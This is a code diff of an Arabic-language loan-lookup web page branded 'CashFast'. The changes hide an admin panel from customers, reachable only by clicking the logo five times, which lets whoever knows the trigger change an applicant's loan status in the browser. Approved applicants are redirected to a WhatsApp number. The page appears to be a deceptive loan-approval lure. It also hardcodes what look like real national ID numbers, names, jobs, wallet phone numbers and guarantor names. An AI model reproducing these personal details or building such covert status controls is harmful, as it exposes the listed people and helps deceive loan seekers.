-            border-radius: 2rem;
-            padding: 0.3rem 1.2rem;
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: var(--gold);
-            margin: 0.3rem 0;
-        }
-
-        .modal-footer {
-            padding: 0.8rem;
-            border-top: 1px solid var(--border-color);
-            text-align: center;
-        }
-
-        .modal-footer .btn-modal-whatsapp {
-            width: 100%;
-            padding: 0.7rem;
-            border: none;
-            border-radius: 2rem;
-            background: linear-gradient(135deg, #25D366, #128C7E);
-            color: white;
-            font-weight: 800;
-            font-size: 0.85rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            transition: 0.2s;
-        }
-
-        .modal-footer .btn-modal-whatsapp:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(37, 211, 102, 0.35);
-        }
-
-        .modal-footer .close-modal-btn {
-            background: transparent;
-            border: none;
-            color: var(--text-muted);
-            margin-top: 0.5rem;
-            cursor: pointer;
-            font-size: 0.75rem;
-        }
-
-        /* ===== لوحة تحكم المدير ===== */
-        .admin-toggle {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin: 0.5rem 0;
-            padding: 0.3rem 0.8rem;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 2rem;
-            border: 1px solid var(--border-color);
-            cursor: pointer;
-            transition: 0.2s;
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            position: relative;
-            z-index: 1;
-        }
-
-        .admin-toggle:hover {
-            border-color: var(--gold);
-        }
-
-        .admin-toggle i {
-            color: var(--gold);
-            font-size: 0.8rem;
-        }
-
-        .admin-toggle.active {
-            border-color: var(--gold);
-            background: rgba(212, 175, 55, 0.05);
-        }
-
-        .admin-panel {
-            display: none;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.6rem 0;
-            border: 1px solid var(--border-color);
-        }
-
-        .admin-panel.show {
-            display: block;
-        }
-
-        .admin-panel .admin-title {
-            font-size: 0.8rem;
-            color: var(--gold);
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            text-align: center;
-        }
-
-        .admin-panel .btn-group {
-            display: flex;
-            gap: 0.4rem;
-            flex-wrap: wrap;
-        }
-
-        .admin-panel .btn-group button {
-            flex: 1;
-            min-width: 80px;
-            padding: 0.4rem 0.6rem;
-            border: none;
-            border-radius: 2rem;
-            font-size: 0.65rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        .admin-panel .btn-group button:hover {
-            transform: scale(1.02);
-        }
-
-        .btn-status-approved {
-            background: var(--primary);
-            color: #0A0F1A;
-        }
-
-        .btn-status-review {
-            background: var(--warning);
-            color: #0A0F1A;
-        }
-
-        .btn-status-rejected {
-            background: var(--danger);
-            color: white;
-        }
-
-        .admin-status-current {
-            font-size: 0.65rem;
-            color: var(--text-muted);
-            text-align: center;
-            margin-top: 0.3rem;
-        }
+        /* ===== لوحة تحكم المدير (مخفية عن العميل) ===== */
+        .admin-panel { display: none; background: rgba(255,255,255,0.03); border-radius: 1rem; padding: 0.8rem; margin: 0.6rem 0; border: 1px solid var(--border-color); }
+        .admin-panel.show { display: block; }
+        .admin-panel .admin-title { font-size: 0.8rem; color: var(--gold); font-weight: 700; margin-bottom: 0.5rem; text-align: center; }
+        .admin-panel .btn-group { display: flex; gap: 0.4rem; flex-wrap: wrap; }
+        .admin-panel .btn-group button { flex: 1; min-width: 80px; padding: 0.4rem 0.6rem; border: none; border-radius: 2rem; font-size: 0.65rem; font-weight: 700; cursor: pointer; transition: 0.2s; font-family: 'Cairo', sans-serif; }
+        .admin-panel .btn-group button:hover { transform: scale(1.02); }
+        .btn-status-approved { background: var(--primary); color: #0A0F1A; }
+        .btn-status-review { background: var(--warning); color: #0A0F1A; }
+        .btn-status-rejected { background: var(--danger); color: white; }
+        .admin-status-current { font-size: 0.65rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem; }
 
         .text-center { text-align: center; }
         .text-muted { color: var(--text-muted); }
@@ -881,7 +161,6 @@
             .header .brand h1 { font-size: 1rem; }
             .admin-panel .btn-group button { font-size: 0.55rem; padding: 0.3rem 0.4rem; min-width: 60px; }
         }
-
         @media (max-width: 360px) {
             .loan-card .loan-amount-main { font-size: 1.6rem; }
             .loan-details-grid { grid-template-columns: 1fr 1fr; }
@@ -895,7 +174,7 @@
 
         <!-- ===== الهيدر ===== -->
         <div class="header">
-            <div class="brand">
+            <div class="brand" id="brandLogo">
                 <div class="icon">⚡</div>
                 <h1>Cash<span>Fast</span></h1>
             </div>
@@ -918,22 +197,6 @@
             <button onclick="searchCustomer()"><i class="fas fa-search"></i> استعلام</button>
         </div>
 
-        <!-- ===== زر صلاحية المدير ===== -->
-        <div class="admin-toggle" id="adminToggle" onclick="toggleAdmin()">
-            <i class="fas fa-user-shield"></i>
-            <span>صلاحية المدير</span>
-            <i class="fas fa-chevron-down" style="font-size: 0.5rem;"></i>
-        </div>
-        <div class="admin-panel" id="adminPanel">
-            <div class="admin-title"><i class="fas fa-cog"></i> تغيير حالة الطلب</div>
-            <div class="btn-group">
-                <button class="btn-status-approved" onclick="changeStatus('approved')">✅ موافقة</button>
-                <button class="btn-status-review" onclick="changeStatus('review')">⏳ مراجعة</button>
-                <button class="btn-status-rejected" onclick="changeStatus('rejected')">❌ رفض</button>
-            </div>
-            <div class="admin-status-current" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
-        </div>
-
         <!-- ===== مكان النتيجة ===== -->
         <div id="resultArea"></div>
 
@@ -947,6 +210,17 @@
         <div class="loader" id="loader">
             <i class="fas fa-spinner fa-pulse"></i>
             <p>جاري جلب البيانات...</p>
+        </div>
+
+        <!-- ===== لوحة المدير (مخفية، تظهر فقط بتفعيل خاص) ===== -->
+        <div class="admin-panel" id="adminPanel">
+            <div class="admin-title"><i class="fas fa-cog"></i> تغيير حالة الطلب</div>
+            <div class="btn-group">
+                <button class="btn-status-approved" onclick="changeStatus('approved')">✅ موافقة</button>
+                <button class="btn-status-review" onclick="changeStatus('review')">⏳ مراجعة</button>
+                <button class="btn-status-rejected" onclick="changeStatus('rejected')">❌ رفض</button>
+            </div>
+            <div class="admin-status-current" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
         </div>
 
     </div>
@@ -983,9 +257,8 @@
         const WHATSAPP_NUMBER = "212631288235";
         const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
 
-        // ======================= قاعدة بيانات العملاء (41 عميل) =======================
+        // ======================= قاعدة بيانات العملاء =======================
         const clientsData = [
-            // ===== العملاء الجدد =====
             {
                 id: "30307072100878",
                 name: "محمد علاء الدين محمد",
@@ -1518,7 +791,6 @@
                 reviewStatus: "approved",
                 needsEtisalat: true
             },
-            // ===== العميل هاني احمد (تم تصحيح الرقم) =====
             {
                 id: "26912070102312",
                 name: "هاني احمد محمد محمد",
@@ -1634,29 +906,30 @@
                 needsEtisalat: true
             },
             {
-    id: "27201211601075",
-    name: "كمال صلاح السيد شوشان",
-    job: "رئيس قلم محكمة مرسى مطروح الابتدائيه",
-    loanRaw: "100,000",
-    loanTerm: "32 شهر",
-    installment: "4,157",
-    total: "133,024",
-    wallet: "اتصالات كاش",
-    walletNum: "01157446643",
-    guarantorRelation: "أخ",
-    guarantorName: "السيد صلاح السيد شوشان",
-    guarantorId: "غير مسجل",
-    guarantorPhone: "غير مسجل",
-    reason: "تطوير العمل",
-    otherLoans: "لا",
-    reviewStatus: "approved",
-    needsEtisalat: true
-}
+                id: "27201211601075",
+                name: "كمال صلاح السيد شوشان",
+                job: "رئيس قلم محكمة مرسى مطروح الابتدائيه",
+                loanRaw: "100,000",
+                loanTerm: "32 شهر",
+                installment: "4,157",
+                total: "133,024",
+                wallet: "اتصالات كاش",
+                walletNum: "01157446643",
+                guarantorRelation: "أخ",
+                guarantorName: "السيد صلاح السيد شوشان",
+                guarantorId: "غير مسجل",
+                guarantorPhone: "غير مسجل",
+                reason: "تطوير العمل",
+                otherLoans: "لا",
+                reviewStatus: "approved",
+                needsEtisalat: true
+            }
         ];
 
         let currentClient = null;
         let currentIndex = -1;
         let isAdmin = false;
+        let adminClickCount = 0;
 
         // ===== حساب الإجمالي =====
         function calculateTotal(client) {
@@ -1727,7 +1000,6 @@
                 walletDisplay = "📱 سيتم فتح اتصالات كاش";
             }
 
-            // حالة الطلب
             const statusMap = {
                 'approved': '✅ معتمد',
                 'review': '⏳ قيد المراجعة',
@@ -1815,7 +1087,7 @@
             `;
         }
 
-        // ===== بناء رسالة التهنئة (تظهر فقط للموافقين) =====
+        // ===== بناء رسالة التهنئة =====
         function buildCongratsBox(client) {
             if (client.reviewStatus === 'rejected') {
                 return `
@@ -1846,7 +1118,7 @@
             `;
         }
 
-        // ===== بناء إشعار المحفظة (يظهر فقط للموافقين) =====
+        // ===== بناء إشعار المحفظة =====
         function buildWalletNotice(client) {
             if (client.reviewStatus !== 'approved') return '';
 
@@ -1897,15 +1169,12 @@
             const resultArea = document.getElementById('resultArea');
             const totalDisplay = calculateTotal(client);
 
-            // تحديث حالة العميل في لوحة المدير
             updateAdminStatus(client.reviewStatus || 'approved');
 
             let html = '';
 
-            // بطاقة القرض
             html += buildLoanCard(client, totalDisplay);
 
-            // شريط الحالة حسب نوع الحالة
             const status = client.reviewStatus || 'approved';
             const statusMap = {
                 'approved': { class: 'approved', icon: 'fa-check-circle', main: '✅ تمت الموافقة النهائية!', sub: 'تم اعتماد طلب التمويل الخاص بك بنجاح', badge: 'معتمد' },
@@ -1925,16 +1194,10 @@
                 </div>
             `;
 
-            // رسالة التهنئة (تختلف حسب الحالة)
             html += buildCongratsBox(client);
-
-            // إشعار المحفظة (يظهر فقط للموافقين)
             html += buildWalletNotice(client);
-
-            // تفاصيل العميل
             html += buildClientDetails(client);
 
-            // زر واتساب (يظهر فقط للموافقين)
             if (client.reviewStatus === 'approved') {
                 const needsEtisalat = client.needsEtisalat === true || 
                     (client.wallet && client.wallet.includes("سيتم فتح"));
@@ -1946,7 +1209,6 @@
 
                 html += `<button class="btn-whatsapp etisalat-btn" id="directWhatsAppBtn">${btnText}</button>`;
 
-                // ربط زر واتساب
                 setTimeout(() => {
                     const btn = document.getElementById('directWhatsAppBtn');
                     if (btn) {
@@ -1957,7 +1219,6 @@
                     }
                 }, 100);
 
-                // توجيه تلقائي إلى واتساب بعد 5 ثواني (للموافقين فقط)
                 setTimeout(() => {
                     showRedirectModal(client);
                 }, 5000);
@@ -1967,7 +1228,7 @@
             document.getElementById('errorBox').style.display = 'none';
         }
 
-        // ===== مودال التوجيه إلى واتساب =====
+        // ===== مودال التوجيه =====
         function showRedirectModal(client) {
             const modal = document.getElementById('redirectModal');
             const modalInfoDiv = document.getElementById('modalClientInfo');
@@ -2008,17 +1269,14 @@
             document.getElementById('redirectModal').style.display = 'none';
         }
 
-        // ===== صلاحية المدير =====
+        // ===== صلاحية المدير (مخفية عن العميل) =====
         function toggleAdmin() {
             isAdmin = !isAdmin;
             const panel = document.getElementById('adminPanel');
-            const toggle = document.getElementById('adminToggle');
             if (isAdmin) {
                 panel.classList.add('show');
-                toggle.classList.add('active');
             } else {
                 panel.classList.remove('show');
-                toggle.classList.remove('active');
             }
         }
 
@@ -2076,12 +1334,13 @@
         }
 
         // ===== تفعيل صلاحية المدير (نقر 5 مرات على الشعار) =====
-        let adminClickCount = 0;
-        document.querySelector('.brand .icon')?.addEventListener('click', function() {
+        document.getElementById('brandLogo')?.addEventListener('click', function() {
             adminClickCount++;
             if (adminClickCount >= 5) {
                 toggleAdmin();
                 adminClickCount = 0;
+                // إشعار للمدير فقط (يظهر في console)
+                console.log('✅ تم تفعيل صلاحية المدير');
             }
             setTimeout(() => { adminClickCount = 0; }, 3000);
         });
@@ -2106,7 +1365,6 @@
         window.searchCustomer = searchCustomer;
         window.closeModal = closeModal;
         window.openWhatsApp = openWhatsApp;
-        window.toggleAdmin = toggleAdmin;
         window.changeStatus = changeStatus;
     </script>
 
